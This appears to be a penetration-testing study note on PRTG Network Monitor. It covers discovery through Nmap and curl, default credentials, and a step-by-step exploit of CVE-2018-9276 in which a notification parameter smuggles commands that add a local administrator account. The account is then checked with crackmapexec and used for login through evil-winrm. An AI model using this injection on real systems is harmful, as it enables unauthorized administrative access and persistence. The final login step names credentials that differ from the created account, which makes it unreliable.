---
title: PRTG Network Monitor
aliases: []
tags:
- study-notes/network-monitoring
- tool/prtg
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: prtgNetworkMonitor.md
related_tools:
- '[[nmap]]'
- '[[curl]]'
- '[[eyewitness]]'
- '[[crackmapexec]]'
- '[[evil-winrm]]'
related_techniques:
- '[[t1190]]'
related_tactics:
- '[[ta0003]]'
related_services:
- '[[http]]'
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: '8080'
protocol: http
os: ''
---

# PRTG Network Monitor

## Description
PRTG Network Monitor is agentless network monitoring software that can be used to monitor bandwidth usage, uptime, and collect statistics from various hosts, including routers, switches, servers, and more. It works with an autodiscovery mode to scan network areas and create a device list. Detected devices can be monitored using protocols such as ICMP, SNMP, WMI, NetFlow, and more. Devices can also communicate with the tool via a REST API. The software runs entirely from an AJAX-based website, but there is a desktop application available for Windows, Linux, and macOS.

## Discovery
PRTG Network Monitor can be discovered via an Nmap scan on port 8080. The default credentials are `prtgadmin:prtgadmin`. Here is an example Nmap command and its output:
```sh
sudo nmap -sV -p- --open -T4 10.129.201.50
```
```sh
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.06% done
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 65492 closed ports, 24 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  ssl/http      Splunkd httpd
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp  open  ssl/http      Splunkd httpd
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.17 seconds
```

Tools like Eyewitness can be used to find default credentials. To get the version, use the following command:
```sh
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```

## Exploits
PRTG Network Monitor has been known to have vulnerabilities, such as CVE-2018-9276, which was present in prior versions 18.2.39. The following steps can be used to exploit this vulnerability:

1. Mouse over `Setup` in the top right and then the `Account Settings` menu, and click on `Notifications`.
2. Click on `Add new notification`.
3. Give the notification a name and scroll down to tick the box next to `EXECUTE PROGRAM`. Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down. In the parameter field, enter the following command: `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`. Click the `Save` button.
4. After clicking `Save`, the notification will be added to the list and can be scheduled to run at a later time for persistence.
5. Test the notification by clicking `Test`, which will create the account.
6. Confirm the account creation using `crackmapexec`:
```sh
crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```
7. Connect to the system using `evil-winrm`:
```sh
evil-winrm -i 10.129.201.50 -u adam -p 'Password123!'
```

## References
- https://www.paessler.com/prtg
- https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html
- https://nvd.nist.gov/vuln/detail/CVE-2018-9276

